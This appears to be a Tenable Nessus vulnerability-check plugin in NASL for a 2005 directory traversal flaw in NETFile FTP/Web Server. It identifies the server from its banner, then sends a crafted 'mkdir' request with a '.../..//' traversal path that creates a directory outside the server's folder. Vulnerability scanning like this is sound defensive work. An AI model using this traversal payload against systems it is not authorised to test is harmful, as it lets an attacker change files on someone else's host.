#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(18223);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2012/10/23 11:08:55 $");

  script_bugtraq_id(13388);
  script_osvdb_id(15914);

  script_name(english:"NETFile FTP/Web Server Directory Traversal Arbitrary File Access");
  script_summary(english:"Checks for directory traversal vulnerabilities in NETFile FTP/Web Server");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a directory traversal attack.");
  script_set_attribute(attribute:"description", value:
"The version of NETFile FTP/Web server installed on the remote host is
prone to directory traversal attacks.  Specifically, an attacker can
create directories outside the server's folder path with a specially
crafted URL.  The attacker may also be able to delete arbitrary files
and directories on the remote host.");
  script_set_attribute(attribute:"see_also", value:"http://www.security.org.sg/vuln/netfileftp746.html");
  script_set_attribute(attribute:"solution", value:
"Configure NETFile with tighter file and folder rights for users and
groups or upgrade to NETFile FTP/Web Server version 7.5.0 Beta 7 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:S/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/04/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/05/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:fastream:netfile_ftp_web_server");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2012 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


# Make sure the server's banner indicates it's from NETFile.
port = get_http_port(default:80);
banner = get_http_banner(port:port);
if (!banner || banner !~ "^Server: Fastream NETFile") exit(0);


# Try to create a random directory alongside NETFile's folder path.
dir = string(SCRIPT_NAME, "-", rand_str());
r = http_send_recv3(method:"GET",   port:port,
  item:string(
    "/?",
    "command=mkdir&",
    "filename=.../..//a/.../", dir
  ),
  exit_on_fail:TRUE);
res = r[2];

if (
  res && 
  egrep(string:res, pattern:string(dir, '": folder created\\.'), icase:TRUE)
)
{
  if (report_verbosity > 0)
  {
    report = string(
      "Nessus has successfully exploited this vulnerability by adding the\n",
      "directory ../", dir, " relative to NETFile's folder path\n",
      "on the remote host; you may wish to remove it at your convenience.\n"
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else audit(AUDIT_HOST_NOT, "affected");
